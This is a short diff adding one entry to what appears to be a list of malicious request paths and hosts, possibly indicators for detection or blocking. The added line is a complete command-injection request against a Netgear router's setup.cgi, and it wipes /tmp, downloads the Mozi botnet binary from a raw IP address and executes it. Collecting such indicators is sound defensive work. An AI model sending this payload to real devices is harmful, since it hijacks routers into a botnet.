@@ -17300,3 +17300,4 @@ pro.ip-api.com:443
 /aleoxjrm.php?Fox=d3wL7
 /cdnjs.cloud
 /eyzpeefh.php?Fox=d3wL7
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.49.195.75:34645/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
